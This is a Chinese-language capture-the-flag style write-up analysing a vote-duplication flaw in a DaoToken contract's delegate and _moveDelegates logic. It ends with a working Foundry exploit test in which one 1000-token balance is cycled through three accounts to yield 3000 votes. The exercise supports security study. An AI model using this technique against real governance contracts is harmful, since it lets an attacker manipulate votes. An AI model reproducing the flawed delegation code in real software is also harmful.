# DaoToken 合約問題

任一 user 使用 delegate function 時，delegate function 會間接調用\_delegates 查出其映射的地址，並根據 user 錢包裡的 Token 數目生成 vote，再調用\_moveDelegates function；此時只要 user 的地址映射是 address(0)，便會導致\_moveDelegates function 只執行下半部的 if 指令，使 to 能得到 vote。

```
function delegate(address _addr) external {
    return _delegate(msg.sender, _addr);
}

function _delegate(address _addr, address delegatee) internal {
    address currentDelegate = _delegates[_addr];
    uint256 _addrBalance = balanceOf(_addr);
    _delegates[_addr] = delegatee;
    _moveDelegates(currentDelegate, delegatee, _addrBalance);
}
```

## 漏洞 1： \_delegates

user 使用 delegate function 時，會間接調用\_delegates。

```
mapping(address => address) internal _delegates;
```

mapping address 預設的對應值是 address(0)，意即 alice, bob, carol, hacker 的地址的預設映射值皆是 address(0)。

## 漏洞 2： \_moveDelegates function

delegate function 也會間接調用\_moveDelegates function。

```
function _moveDelegates(address from, address to, uint256 amount) internal {
    if (from != to && amount > 0) {
        if (from != address(0)) {
            uint32 fromNum = numCheckpoints[from];
            uint256 fromOld = fromNum > 0 ? checkpoints[from][fromNum - 1].votes : 0;
            uint256 fromNew = fromOld - amount;
            _writeCheckpoint(from, fromNum, fromOld, fromNew);
        }

        if (to != address(0)) {
            uint32 toNum = numCheckpoints[to];
            uint256 toOld = toNum > 0 ? checkpoints[to][toNum - 1].votes : 0;
            uint256 toNew = toOld + amount;
            _writeCheckpoint(to, toNum, toOld, toNew);
        }
    }
}
```

調用\_moveDelegates function 時，要是 from = address(0)便不會執行上半部的 if 指令；若此時 to != address(0)，就會執行下半部的 if 指令，結果會使 to 得到 vote。

## 結合上述漏洞的攻擊流程

由於 hacker 有 Alice, Bob, Carol 三人的 private key，Alice 有 1000 顆 Token：

1. 用 Alice 的身份調用 delegate function，delegate function 會生成 1000 張 vote 並將 vote 轉移到 hacker 身上。
2. 將 Alice 的 Token 使用 transfer 轉移給 Bob。
3. 用 Bob 的身份執行步驟 1，再將 Token 轉移給 Carol。
4. 用 Carol 的身份執行步驟 1，再將 Token 轉移給 hacker。

最後 hacker 會得到 3000 張 vote 與 1000 顆 Token。

```
function testExploit() public {
    vm.startPrank(alice);

    // write your soluiton here
    daoToken.delegate(hacker);
    daoToken.transfer(bob, 1000);
    vm.startPrank(bob);
    daoToken.delegate(hacker);
    daoToken.transfer(carol, 1000);
    vm.startPrank(carol);
    daoToken.delegate(hacker);
    daoToken.transfer(hacker, 1000);

    vm.stopPrank();

    uint256 hacker_vote = daoToken.getVotes(hacker);
    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

    uint256 hacker_balance = daoToken.balanceOf(hacker);
    console.log("Hacker's daoToken after the attack: %s: ", hacker_balance);

    assertEq(hacker_vote, 3000);
    assertEq(hacker_balance, 1000);
}
```
